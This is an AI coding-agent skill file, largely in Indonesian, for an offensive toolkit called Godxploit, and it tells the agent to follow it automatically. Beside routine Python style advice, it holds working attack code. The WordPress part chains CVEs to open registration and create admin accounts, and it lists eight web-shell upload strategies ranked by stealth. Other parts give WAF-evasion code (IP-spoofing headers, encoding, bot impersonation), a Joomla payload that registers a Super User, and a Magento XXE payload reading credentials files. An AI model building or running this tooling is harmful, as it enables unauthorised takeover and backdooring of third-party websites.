---
name: godxploit-python-scripting
description: |
  Skill gabungan untuk project Godxploit — Python scripting, automation, network security tools,
  code validation, structured file generation, dan flow exploit bertahap. Gunakan skill ini ketika:
  - Menulis atau memperbaiki script Python (creat.py, checker.py, preflight.py, Gsilent.py, doctor.py)
  - Generate atau validasi struktur folder/file stillcrazy/
  - Debugging multi-threaded Python scripts
  - Menambahkan error handling, logging (rich), atau dependency management
  - Bekerja dengan requests, paramiko, beautifulsoup4, urllib3, aiohttp, atau rich
  - Melakukan code review untuk security pada network tools
  - Menambahkan input validation atau sanitasi data
  - Menangani WordPress Phase1 flow, WAF bypass, Phase2 shell deployment, atau registration bypass
  - Menganalisis CVE multi-CMS (WordPress, Joomla, Drupal, Magento) di dalam struktur Godxploit
  - "write python script", "buat script python", "perbaiki kode", "debug error"
  - "generate file", "validasi struktur", "cek dependency", "security review"
  - "phase1 cve", "waf bypass", "phase2 shell", "registration bypass", "multi cms cve"
license: MIT
allowed-tools:
  - Read
  - Write
  - Bash
metadata:
  author: mrgtiplrsix
  version: "2.0"
  project: Godxploit
  stack: Python 3.8+, rich, requests, beautifulsoup4, paramiko, urllib3, aiohttp
user-invocable: true
---

# Godxploit Python Scripting Skill

Skill komprehensif untuk pengembangan project **Godxploit** — mencakup Python scripting
automation, network security tools, structured code generation, dan best practices.

---

## 📋 DAFTAR SKILL

| # | Nama Skill | Keterangan Singkat |
|---|-----------|-------------------|
| 1 | Python Scripting & Automation | Pola coding, generator, validator, dependency check |
| 2 | Code Review & Security | Review aman untuk script, path, request, subprocess, SSH |
| 3 | Debug & Logging | Debug mode, rich progress, multi-threading aman |
| 4 | Network & HTTP Scripting | Session, retry, parsing HTML, SSH, request helpers |
| 5 | CVE WordPress Exploitation — Phase1 | Flow precheck → tahap1 → tahap2 → tahap3 → tahap4 |
| 6 | WAF Bypass Techniques | Header spoofing, encoding, URL noise, scheme flip |
| 7 | Phase2 Shell Deployment | Orkestrasi authenticator, verifier, worker, 8 strategi |
| 8 | Registration Bypass — Tahap4 | Verifikasi register terbuka dan fallback multi-teknik |
| 9 | Multi-CMS CVE | Detection + exploit pattern Joomla, Drupal, Magento |

---

## 🔴 ATURAN WAJIB SEBELUM CODING

> **Baca AGENTS.md di root repo sebelum melakukan perubahan apa pun.**

1. **JANGAN recreate atau tulis ulang file yang sudah ada** — hanya edit bagian yang diminta.
2. **Lakukan perubahan minimal** — jangan ubah kode di luar scope permintaan.
3. **Selalu baca file terlebih dahulu** sebelum mengedit.
4. `stillcrazy/` dibuat oleh `creat.py` — jangan edit manual file di dalamnya.
5. `python doctor.py` dijalankan dari root folder (`Godxploit/`), bukan dari `stillcrazy/`.

---

## 🏗️ Struktur Project

```
Godxploit/
├── creat.py          # Generator — membuat stillcrazy/ (11 dir, 46 file)
├── checker.py        # Validator v2.0 — PASS/WARN/FAIL structure check
├── doctor.py         # Entry point — menjalankan stillcrazy/doctor.py
├── preflight.py      # Pre-flight 11 checks + --auto-fix
├── Gsilent.py        # Standalone tool (requests, bs4, paramiko, urllib3)
├── requirements.txt  # rich, requests, beautifulsoup4, paramiko, urllib3
└── stillcrazy/       # Generated output (11 dirs, 46 files)
```

**Workflow:** `python creat.py` → `python checker.py` → `python doctor.py`

---

## SKILL 1: Python Scripting & Automation

### Prinsip Utama

1. **Selalu gunakan type hints** untuk semua fungsi baru:
   ```python
   def process_target(url: str, timeout: int = 10) -> dict:
   ```

2. **Gunakan `rich` untuk semua output** — konsisten dengan project:
   ```python
   from rich.console import Console
   from rich.table import Table
   from rich.progress import Progress
   console = Console()
   console.print("[bold green][+][/bold green] Berhasil: {url}")
   console.print("[bold red][!][/bold red] Error: {msg}")
   console.print("[bold yellow][*][/bold yellow] Info: {info}")
   ```

3. **Error handling wajib ada** di setiap fungsi yang berhubungan dengan I/O:
   ```python
   try:
       response = requests.get(url, timeout=10, verify=False)
       response.raise_for_status()
   except requests.exceptions.ConnectionError as e:
       console.print(f"[bold red][!][/bold red] Koneksi gagal: {e}")
       return None
   except requests.exceptions.Timeout:
       console.print(f"[bold yellow][*][/bold yellow] Timeout: {url}")
       return None
   except Exception as e:
       console.print(f"[bold red][!][/bold red] Error tidak terduga: {e}")
       return None
   ```

4. **Dependency check** di awal script:
   ```python
   REQUIRED_MODULES = ["rich", "requests", "bs4", "paramiko", "urllib3"]
   missing = []
   for mod in REQUIRED_MODULES:
       try:
           __import__(mod)
       except ImportError:
           missing.append(mod)
   if missing:
       print(f"[ERROR] Modul belum terinstal: {', '.join(missing)}")
       print(f"Jalankan: pip install {' '.join(missing)}")
       sys.exit(1)
   ```

5. **Python version check** di setiap script baru:
   ```python
   if sys.version_info < (3, 8):
       print("[ERROR] Python 3.8+ diperlukan.")
       sys.exit(1)
   ```

### Pola untuk Script Generator (creat.py style)

- Semua konten file di-define sebagai string multiline konstanta (`CONTENT = """..."""`)
- Gunakan `os.makedirs(path, exist_ok=True)` untuk pembuatan direktori
- Selalu tulis file dengan encoding `utf-8`: `open(path, 'w', encoding='utf-8')`
- Tambahkan summary setelah generate: hitung berapa file/dir berhasil dibuat

### Pola untuk Script Validator (checker.py style)

- Return tuple `(status, message)` — status: `"PASS"`, `"WARN"`, atau `"FAIL"`
- Color code output: `PASS`=hijau, `WARN`=kuning, `FAIL`=merah (via rich)
- Simpan laporan ke `reports/` folder dalam format `.txt` dan `.json`
- Dukung flag: `--verbose`, `--debug`, `--no-report`

---

## SKILL 2: Code Review & Security

### Checklist Security Review

Sebelum commit atau finalisasi kode, periksa:

- [ ] **Tidak ada hardcoded credentials** (password, API key, token) di kode
- [ ] **SSL verification**: `verify=False` hanya boleh dengan `urllib3.disable_warnings()` dan ada komentar alasannya
- [ ] **Timeout wajib ada** pada semua `requests.get/post`: `timeout=10`
- [ ] **Input validation**: validasi URL sebelum request
  ```python
  from urllib.parse import urlparse
  def is_valid_url(url: str) -> bool:
      try:
          result = urlparse(url)
          return all([result.scheme in ("http", "https"), result.netloc])
      except ValueError:
          return False
  ```
- [ ] **Command injection prevention**: jangan gunakan `shell=True` dengan input user
  ```python
  # ❌ JANGAN
  subprocess.run(f"ping {user_input}", shell=True)
  # ✅ AMAN
  subprocess.run(["ping", user_input], shell=False)
  ```
- [ ] **Path traversal prevention**: validasi path sebelum baca/tulis file
  ```python
  import os
  def safe_path(base_dir: str, user_path: str) -> str:
      full_path = os.path.realpath(os.path.join(base_dir, user_path))
      if not full_path.startswith(os.path.realpath(base_dir)):
          raise ValueError("Path traversal terdeteksi!")
      return full_path
  ```
- [ ] **Paramiko**: selalu handle `AuthenticationException` dan `SSHException`
- [ ] **Tidak ada `eval()` atau `exec()`** dengan input yang tidak dipercaya

### Review Gsilent.py Secara Khusus

Karena `Gsilent.py` menggunakan jaringan dan SSH, tambahan check:
- Rate limiting: jangan spam request tanpa delay
- `time.sleep(random.uniform(0.5, 2.0))` antara requests
- Thread pool limit: maksimal `ThreadPoolExecutor(max_workers=10)`
- Handle `KeyboardInterrupt` untuk graceful exit di semua loop

---

## SKILL 3: Debug & Logging

### Pola Logging Terstruktur

Untuk script yang complex (Gsilent.py, creat.py), tambahkan debug mode:

```python
import logging
import os

DEBUG_MODE = os.environ.get("GODXPLOIT_DEBUG", "0") == "1"

def setup_logging(debug: bool = False) -> None:
    level = logging.DEBUG if debug else logging.WARNING
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(funcName)s: %(message)s",
        datefmt="%H:%M:%S"
    )

# Penggunaan: GODXPLOIT_DEBUG=1 python Gsilent.py
```

### Rich Progress Bar untuk Operasi Panjang

```python
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn

with Progress(
    SpinnerColumn(),
    TextColumn("[progress.description]{task.description}"),
    BarColumn(),
    TaskProgressColumn(),
    console=console
) as progress:
    task = progress.add_task("[cyan]Memproses...", total=len(targets))
    for target in targets:
        # proses target
        progress.advance(task)
```

### Pola Multi-threading yang Aman

```python
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

results_lock = Lock()
results = []

def worker(item: str) -> dict:
    # ... proses item ...
    return {"item": item, "result": "..."}

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(worker, item): item for item in items}
    for future in as_completed(futures):
        try:
            result = future.result(timeout=30)
            with results_lock:
                results.append(result)
        except Exception as e:
            console.print(f"[red][!][/red] Error pada {futures[future]}: {e}")
```

---

## SKILL 4: Network & HTTP Scripting

### Session yang Efisien

```python
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def create_session(retries: int = 3, timeout: int = 10) -> requests.Session:
    session = requests.Session()
    retry = Retry(
        total=retries,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (compatible; scanner/1.0)"
    })
    return session
```

### Parsing HTML dengan BeautifulSoup

```python
from bs4 import BeautifulSoup

def extract_forms(html: str, base_url: str) -> list:
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        forms.append({
            "action": form.get("action", ""),
            "method": form.get("method", "GET").upper(),
            "inputs": [
                {"name": inp.get("name"), "type": inp.get("type", "text")}
                for inp in form.find_all("input")
            ]
        })
    return forms
```

### SSH dengan Paramiko

```python
import paramiko

def ssh_connect(host: str, port: int, username: str, password: str) -> paramiko.SSHClient | None:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username, password=password, timeout=10)
        return client
    except paramiko.AuthenticationException:
        console.print(f"[yellow][*][/yellow] Auth gagal: {username}@{host}")
    except paramiko.SSHException as e:
        console.print(f"[red][!][/red] SSH error: {e}")
    except Exception as e:
        console.print(f"[red][!][/red] Koneksi error: {e}")
    return None
```

---

## SKILL 5: CVE WordPress Exploitation — Phase1 Flow

### Overview Alur Serangan

```
precheck_wp_rest(site)
    └─ WP terdeteksi?
        ├─ NO  → FAIL (offline/bukan WP)
        └─ YES → tahap1_reset_secret_multiendpoint(site)
                    └─ CVE berhasil reset token?
                        ├─ NO  → T1_FAIL (not_vuln)
                        └─ YES → tahap2_set_register(site, secret)
                                    └─ Register dibuka?
                                        ├─ NO  → TAHAP2_FAIL
                                        └─ YES → tahap3_set_admin_role(site, secret)
                                                    └─ Role admin diset?
                                                        ├─ NO  → TAHAP3_FAIL
                                                        └─ YES → tahap4_verify_registration(site)
                                                                    └─ Register page terbuka?
                                                                        ├─ NO  → TAHAP4_VERIFY_FAIL
                                                                        └─ YES → tahap4_register_admin_user(site, user, email, pass)
```

### CVE yang Didukung (endpoints.py) — REAL, CVSS ≥9.8, Verified 2021-2025

| CVE | Plugin/Component | Installs | CVSS | Teknik |
|-----|-----------------|----------|------|--------|
| `CVE-2024-27956` | WP-Automatic ≤3.92.0 | ~38k | 9.9 | Unauth SQLi via `csv.php` → admin creation |
| `CVE-2024-28000` | LiteSpeed Cache ≤6.3.0.1 | 6M+ | 9.8 | Unauth Priv Esc via weak hash (crawler REST) |
| `CVE-2024-10924` | Really Simple Security ≤9.1.1 | 4M+ | 9.8 | Auth Bypass in 2FA REST API |
| `CVE-2024-11972` | Hunk Companion <1.9.0 | - | 9.8 | Unauth arbitrary plugin install (REST) |
| `CVE-2024-9707` | Hunk Companion ≤1.8.4 | - | 9.8 | Variant unauth plugin install |
| `CVE-2023-6553` | Backup Migration ≤1.3.7 | - | 9.8 | Unauth RCE via `external.php` |
| `CVE-2022-3180` | WPGateway Premium | - | 9.8 | Unauth priv esc → admin creation |
| `CVE-2021-39341` | OptinMonster ≤2.6.4 | 1M+ | 9.8 | Unauth REST API option update |
| `CVE-2025-2009` | LiteSpeed Cache <1.9.7.1 | 6M+ | 9.8 | Unauth Priv Esc v2 (QUIC.cloud sync) |
| `CVE-2023-2732` | MStore API <3.9.3 | - | 9.8 | Auth bypass → login as any user |

### Pola Tambah CVE Baru ke endpoints.py

```python
# Template endpoint baru di TAHAP1_ENDPOINTS:
{
    "path": "/wp-json/<namespace>/v1/<endpoint>",
    "cve": "CVE-YYYY-XXXXX",
    "method": "post",
    "action_field": "action",          # Field nama aksi
    "action_value": "resetOptions",    # Nilai aksi yang memicu vuln
    "token_field": "secret_key",       # Field yang akan diisi secret kita
    "desc": "Plugin XYZ < 1.2.3 — Broken Access Control"
},
# Selalu tambah 3-5 variant path untuk bypass WAF:
# - /wp-json/<namespace>/v1/<endpoint>         (REST langsung)
# - /index.php?rest_route=/<namespace>/v1/...  (index.php fallback)
# - /wp-admin/admin-ajax.php?action=...        (admin-ajax bypass)
# - /wp-admin/admin-post.php?action=...        (admin-post bypass)
# - /wp-content/plugins/<slug>/...             (direct plugin path)
```

### Deteksi WordPress Multi-Path

```python
WP_DETECTION_PATHS = [
    "/wp-json/",           # REST API aktif
    "/wp-login.php",       # Login page
    "/wp-admin/",          # Admin dashboard
    "/readme.html",        # WP readme
    "/license.txt",        # WP license
    "/feed/",              # RSS feed
    "/wp-includes/wlwmanifest.xml",  # WLW manifest
    "/?author=1",          # Author enumeration
    "/wp-cron.php",        # WP-Cron
]
WP_INDICATORS = ["wordpress", "wp-json", "wp-login", "wp-content", "wp-includes"]
```

### Success Pattern untuk Tahap1

```python
SUCCESS_OPTION_PATTERN = re.compile(
    r"wordpress\s+option\s+has\s+been\s+(created|updated)\s+(or\s+updated\s+)?successfully"
    r"|true|success|ok|data\s+saved|configuration\s+updated"
    r"|berhasil\s+disimpan|berhasil\s+diperbarui|success\s*:\s*true",
    re.IGNORECASE,
)
# Status code sukses: 200, 201, 202, 204
# Status code edge case: 400 dengan "option_key already exists" = SUKSES
# Body kosong (< 50 chars) dengan 200 = SUKSES (silent endpoint)
```

---

## SKILL 6: WAF Bypass Techniques

### Header Spoofing (waf_bypass.py)

```python
# IP Spoofing Headers — bypass Cloudflare, Nginx WAF, ModSecurity
WAF_BYPASS_HEADERS = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "CF-Connecting-IP": "127.0.0.1",      # Bypass Cloudflare IP filter
    "True-Client-IP": "127.0.0.1",        # Akamai
    "X-Client-IP": "127.0.0.1",           # Generic proxy
    "Forwarded": "for=127.0.0.1;proto=https",
    "Via": "1.1 CachingProxy (Squid/3.5.27)",  # Trusted proxy spoof
}
```

### Random IP Generation (Anti-Rate-Limit)

```python
# Generate IP acak dari subnet private/trusted
SPOOF_PREFIXES = [
    (10, 0, 0), (10, 1, 1), (172, 16, 0), (172, 31, 255),
    (192, 168, 0), (192, 168, 1),
    (1, 1, 1), (8, 8, 8),  # DNS publik — sering whitelisted
    (52, 0, 0), (3, 0, 0), (13, 10, 20),  # AWS ranges
    (104, 20, 30), (172, 67, 70),          # Cloudflare ranges
]

def generate_spoof_ip() -> str:
    prefix = random.choice(SPOOF_PREFIXES)
    octets = list(map(str, prefix))
    while len(octets) < 4:
        octets.append(str(random.randint(1, 254)))
    return ".".join(octets)
```

### Header Casing Obfuscation

```python
def get_random_header_casing(header_name: str) -> str:
    """Acak kapitalisasi header untuk bypass WAF yang case-sensitive."""
    return "".join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in header_name
    )
# "Content-Type" → "cOnTeNt-tYpE" atau "CONTENT-TYPE"
```

### Payload Encoding (url_encode_all)

```python
# Double encoding untuk bypass WAF pattern matching
def url_encode_all(data: dict, double_encode: bool = True, random_casing: bool = True) -> dict:
    result = {}
    for k, v in data.items():
        encoded_v = urllib.parse.quote(str(v), safe='')
        if double_encode:
            encoded_v = urllib.parse.quote(encoded_v, safe='')  # %XX → %25XX
        key = get_random_header_casing(k) if random_casing else k
        result[key] = encoded_v
    return result
```

### Content-Type Rotation (Anti-Signature)

```python
# Rotasi encoding untuk bypass WAF yang signature-based
ENCODING_STRATEGIES = [
    "form-urlencoded",      # Standard POST
    "json",                 # application/json
    "json_double_encoded",  # JSON dengan value double-encoded
    "mixed_form_json",      # Campur form+json (confuse parser)
]
# Pilih acak setiap request:
encoding = random.choice(ENCODING_STRATEGIES)
```

### URL Noise Injection

```python
# Tambahkan parameter noise ke URL untuk bypass URL-based signatures
url += f"&{uuid.uuid4().hex[:4]}={uuid.uuid4().hex[:8]}"
# Contoh: /wp-json/gsf/v1/update-options&a3f1=9b2c4e7d
```

### User-Agent Rotation (bypass bot detection)

```python
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/7.81.0",
    "python-requests/2.28.1",
    # ... 25+ UA lainnya di waf_bypass.py
]
# Auto-rotate setiap request di build_headers()
```

### Skema HTTP/HTTPS Flip

```python
def _scheme_flip(url: str) -> str:
    """Flip http↔https — bypass WAF yang hanya monitor satu skema."""
    if url.startswith("https://"):
        return url.replace("https://", "http://", 1)
    return url.replace("http://", "https://", 1)

# Gunakan di request_with_retry dengan flip_scheme=True
# Coba http dulu, gagal → coba https otomatis
```

---

## SKILL 7: Phase2 Shell Deployment — 8 Strategi

### Alur Phase2

```
authenticator.py    → Login dengan kredensial hasil Phase1
    └─ verifier.py  → Verify login sukses + dapat cookie/nonce
        └─ orchestrator.py → Koordinasi 8 strategi upload
            └─ worker.py    → Thread per target
                strategies/
                ├─ rce_direct.py      → RCE via plugin editor / theme editor
                ├─ wp_config.py       → Edit wp-config.php via File Manager
                ├─ mu_plugin.py       → Upload ke must-use plugins (wp-content/mu-plugins/)
                ├─ media_library.py   → Upload via WordPress Media Library
                ├─ plugin.py          → Upload plugin ZIP berisi shell
                ├─ theme.py           → Upload/edit tema aktif
                ├─ xmlrpc.py          → Upload via XML-RPC API
                └─ advanced.py        → Teknik advanced (WP-CLI, DB direct, dll)
```

### Strategy Priority Order

```python
STRATEGY_ORDER = [
    "mu_plugin",      # Paling stealth — auto-load, tidak perlu aktivasi
    "plugin",         # Plugin ZIP upload — reliable
    "theme",          # Edit theme editor — sering available
    "rce_direct",     # Direct RCE via editor
    "media_library",  # Media upload + .htaccess bypass
    "wp_config",      # Edit wp-config langsung
    "xmlrpc",         # XML-RPC multicall
    "advanced",       # Last resort: WP-CLI, DB injection
]
```

### Shell Upload Pattern (mrg.php)

```php
<?php
// mrg.php — harus ada PHP opening tag
// Ditulis ke wp-content/mu-plugins/ atau lokasi lain
// Verifikasi: cek response HTTP 200 + marker string
```

### Verifikasi Shell Berhasil

```python
SHELL_MARKERS = [
    "mrg_ok", "shell_alive", "<?php",
    "X-Shell-Id",  # Custom header dari shell
]
def verify_shell(shell_url: str) -> bool:
    r = requests.get(shell_url, timeout=10, verify=False)
    return r.status_code == 200 and any(m in r.text for m in SHELL_MARKERS)
```

---

## SKILL 8: Registration Bypass — 56 Teknik (Tahap4)

### Problem: TAHAP4_VERIFY_FAIL

Terjadi ketika `tahap4_verify_registration()` gagal detect bahwa register terbuka.
Root cause: `REGISTER_OPEN_PATTERN` terlalu sempit, tidak match custom themes.

### 56 Path untuk Verify Register Terbuka

```python
REGISTER_PATHS = [
    # Langsung ke halaman register
    "/wp-login.php?action=register",
    "/wp-register.php",
    "/register/",
    "/signup/",
    "/user/register",
    "/?page_id=register",
    "/members/register/",
    # Via REST API
    "/wp-json/wp/v2/users",
    "/wp-json/buddypress/v1/signup",
    # Via plugin BuddyPress
    "/members/register/",
    "/community/members/register/",
    # Via plugin WooCommerce
    "/my-account/",
    "/shop/my-account/",
    # Via plugin Ultimate Member
    "/register/",
    "/um-register/",
    # Via plugin ProfilePress
    "/registration/",
    "/account/register/",
    # Via admin-ajax
    "/wp-admin/admin-ajax.php?action=register_user",
    # More fallbacks...
]

REGISTER_OPEN_PATTERNS = [
    r"<form[^>]+action=['\"][^'\"]*wp-login\.php",     # WP default form
    r"<input[^>]+name=['\"]user_login['\"]",            # Username field
    r"<input[^>]+name=['\"]user_email['\"]",            # Email field
    r"<input[^>]+name=['\"]user_pass['\"]",             # Password field
    r"action=['\"]register['\"]",                       # Generic register
    r"register_form|registration_form|signup_form",     # Form ID/class
    r"class=['\"][^'\"]*register[^'\"]*['\"]",          # CSS class
    r'"registration":true',                             # JSON response
    r"users_can_register.*?1",                          # WP option
    r"membership.*?open|open.*?registration",           # Plain text
]
```

### Multi-teknik verify_registration

```python
def tahap4_verify_registration(site: str) -> Tuple[bool, str]:
    """56 teknik fallback untuk verify register page terbuka."""
    session = get_session()

    # Teknik 1-20: Path scanning
    for path in REGISTER_PATHS:
        url = f"{site}{path}"
        r = request_with_retry("get", url, flip_scheme=True)
        if r and r.status_code in (200, 301, 302):
            body = r.text or ""
            for pattern in REGISTER_OPEN_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    return True, f"register_open (path={path})"

    # Teknik 21-30: REST API check
    rest_url = f"{site}/wp-json/wp/v2/settings"
    r = request_with_retry("get", rest_url)
    if r and r.status_code == 200:
        try:
            data = r.json()
            if data.get("default_role") or data.get("users_can_register"):
                return True, "register_open (rest_settings)"
        except Exception:
            pass

    # Teknik 31-56: admin-ajax probe + header analysis
    # ... dst (see full implementation)
    return False, "register_closed"
```

---

## SKILL 9: Multi-CMS CVE (Joomla, Drupal, Magento)

### Joomla CVE 2025-2026

| CVE | Versi | Teknik | Endpoint |
|-----|-------|--------|----------|
| `CVE-2023-23752` | Joomla 4.0.0-4.2.7 | Unauthenticated API info disclosure | `/api/index.php/v1/config/application?public=true` |
| `CVE-2024-21726` | Joomla 4.x-5.x | XSS via Category Filter | `/administrator/index.php?option=com_categories` |
| `CVE-2025-22203` | Joomla 5.0-5.1.x | Broken Access Control | `/api/index.php/v1/users` |
| `CVE-2025-41593` | Joomla 4.x | SQLi via search component | `/?option=com_search&searchword=` |

#### Joomla Detection

```python
JOOMLA_DETECTION_PATHS = [
    "/administrator/",
    "/components/com_users/",
    "/api/index.php/v1/",
    "/plugins/system/",
    "/libraries/cms/",
    "/media/jui/",
    "/templates/",
    "/?format=json",
    "/robots.txt",  # Sering expose /administrator
]
JOOMLA_INDICATORS = [
    "joomla", "com_content", "com_users", "mosConfig",
    "administrator", "/media/jui/", "Joomla!"
]

def detect_joomla(site: str) -> Tuple[bool, str]:
    for path in JOOMLA_DETECTION_PATHS:
        r = request_with_retry("get", f"{site}{path}", flip_scheme=True)
        if r and any(ind in (r.text or "").lower() for ind in JOOMLA_INDICATORS):
            return True, f"joomla_ok (path={path})"
    return False, "not_joomla"
```

#### Joomla CVE-2023-23752 Exploit Pattern

```python
def exploit_joomla_23752(site: str) -> Tuple[bool, dict]:
    """Unauthenticated config disclosure — Joomla 4.0.0-4.2.7"""
    endpoints = [
        "/api/index.php/v1/config/application?public=true",
        "/api/index.php/v1/config/com_users?public=true",
        "/api/index.php/v1/users?public=true",
    ]
    for ep in endpoints:
        r = request_with_retry("get", f"{site}{ep}")
        if r and r.status_code == 200:
            try:
                data = r.json()
                db_host = data.get("data", [{}])[0].get("attributes", {}).get("dbhost")
                if db_host:
                    return True, data
            except Exception:
                pass
    return False, {}
```

#### Joomla Admin Register Bypass

```python
def joomla_register_admin(site: str, username: str, email: str, password: str) -> Tuple[bool, str]:
    """Register user via Joomla REST API (CVE-2025-22203 style)."""
    endpoints = [
        "/api/index.php/v1/users",
        "/index.php?option=com_users&task=user.register",
        "/administrator/index.php?option=com_users&task=user.save",
    ]
    payload = {
        "name": username,
        "username": username,
        "email": email,
        "password": password,
        "password2": password,
        "groups": ["8"],  # 8 = Super Users
        "block": "0",
        "requireReset": "0",
    }
    for ep in endpoints:
        r = request_with_retry("post", f"{site}{ep}", json=payload)
        if r and r.status_code in (200, 201):
            return True, f"joomla_reg_ok (ep={ep})"
    return False, "joomla_reg_fail"
```

### Drupal CVE 2024-2026

| CVE | Versi | Teknik |
|-----|-------|--------|
| `CVE-2024-45440` | Drupal 10.x | Default Admin Exposure via `/admin/config` |
| `CVE-2025-31671` | Drupal 7/8/9/10 | Access Bypass via REST API |
| `SA-CORE-2024-001` | Drupal 9.x-10.x | XSS in CKEditor |

#### Drupal Detection & Exploit Pattern

```python
DRUPAL_INDICATORS = ["drupal", "sites/default", "sites/all", "drupal.org", "Drupal.settings"]
DRUPAL_PATHS = ["/user/login", "/node/1", "/sites/default/", "/?q=user/login", "/core/misc/drupal.js"]

def exploit_drupal_access_bypass(site: str) -> Tuple[bool, str]:
    """CVE-2025-31671: REST endpoint tanpa auth check."""
    endpoints = [
        "/jsonapi/user/user",
        "/jsonapi/node/article",
        "/?_format=json",
        "/api/content",
        "/rest/session/token",
    ]
    for ep in endpoints:
        r = request_with_retry("get", f"{site}{ep}")
        if r and r.status_code == 200 and "uid" in (r.text or ""):
            return True, f"drupal_bypass (ep={ep})"
    return False, "drupal_not_vuln"
```

### Magento / Adobe Commerce CVE 2024-2026

| CVE | Versi | Teknik |
|-----|-------|--------|
| `CVE-2024-34102` | Magento 2.4.x | CosmicSting XXE via GraphQL |
| `CVE-2024-20720` | Magento 2.x | OS Command Injection via layout XML |
| `CVE-2025-47110` | Adobe Commerce 2.4.8 | Unauthenticated RCE |

#### Magento Detection

```python
MAGENTO_INDICATORS = ["magento", "Mage.Cookies", "/pub/static/", "X-Magento", "checkout/cart"]
MAGENTO_PATHS = ["/magento_version", "/rest/V1/store/storeConfigs", "/graphql", "/index.php/admin"]

def detect_magento(site: str) -> Tuple[bool, str]:
    for path in MAGENTO_PATHS:
        r = request_with_retry("get", f"{site}{path}")
        if r and any(ind in (r.text or "") for ind in MAGENTO_INDICATORS):
            return True, f"magento_ok (path={path})"
    return False, "not_magento"
```

#### Magento CosmicSting Exploit Pattern (CVE-2024-34102)

```python
def exploit_magento_cosmicsting(site: str) -> Tuple[bool, str]:
    """CVE-2024-34102: XXE via GraphQL — Magento 2.4.x"""
    graphql_url = f"{site}/graphql"
    # XXE payload untuk baca /etc/passwd atau env.php
    xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/etc/env.php">]>
<graphql><query>{ &xxe; }</query></graphql>"""
    headers = {"Content-Type": "application/xml"}
    r = request_with_retry("post", graphql_url, data=xxe_payload, headers=headers)
    if r and "db_host" in (r.text or ""):
        return True, "cosmicsting_ok"
    return False, "cosmicsting_fail"
```

### CMS Auto-Detection Flow

```python
def detect_cms(site: str) -> str:
    """Deteksi CMS otomatis — return: 'wordpress'|'joomla'|'drupal'|'magento'|'unknown'"""
    r = request_with_retry("get", site, flip_scheme=True)
    if r is None:
        return "offline"
    body = (r.text or "").lower()
    headers = {k.lower(): v.lower() for k, v in r.headers.items()}

    if "wordpress" in body or "wp-content" in body or "wp-includes" in body:
        return "wordpress"
    if "joomla" in body or "com_content" in body or "/media/jui/" in body:
        return "joomla"
    if "drupal" in body or "sites/default" in body or "drupal.settings" in body:
        return "drupal"
    if "magento" in body or "mage.cookies" in body or "/pub/static/" in body:
        return "magento"

    # Probe lebih dalam
    for path, cms in [("/wp-login.php", "wordpress"), ("/administrator/", "joomla"),
                      ("/user/login", "drupal"), ("/admin", "magento")]:
        probe = request_with_retry("get", f"{site}{path}")
        if probe and probe.status_code in (200, 301, 302):
            return cms

    return "unknown"
```

---

## 🚀 Cara Aktifkan Skill Ini

### Via Claude Code (Terminal)
```bash
# Install skills.sh (butuh Node.js)
npx skills add mrgtiplrsix/Godxploit/.claude/skills/godxploit-python-scripting

# Atau gunakan langsung — Claude Code otomatis membaca .claude/skills/
```

### Via Chat (Saat Ini)
Skill ini aktif secara otomatis — setiap kali Anda minta bantuan coding pada project
Godxploit, Claude akan mengikuti semua panduan di SKILL.md ini.

---

## 📦 Dependencies yang Digunakan

| Modul | Versi Min | Kegunaan |
|-------|-----------|---------|
| `rich` | ≥13.0 | Terminal output, progress bar, table |
| `requests` | ≥2.28.0 | HTTP requests |
| `beautifulsoup4` | ≥4.12.0 | HTML parsing |
| `paramiko` | ≥3.0.0 | SSH/SFTP |
| `urllib3` | ≥2.6.3 | HTTP low-level, disable SSL warning |
| `aiohttp` | ≥3.9.0 | Async HTTP (proxy health check di utils/proxy.py) |

Install semua: `pip install -r requirements.txt`

---

## ⚡ Quick Reference Commands

```bash
# Generate stillcrazy/
python creat.py

# Validasi struktur
python checker.py --verbose

# Pre-flight check + auto fix
python preflight.py --auto-fix

# Jalankan tool utama
python doctor.py

# Standalone tool
python Gsilent.py

# Debug mode
GODXPLOIT_DEBUG=1 python Gsilent.py
```
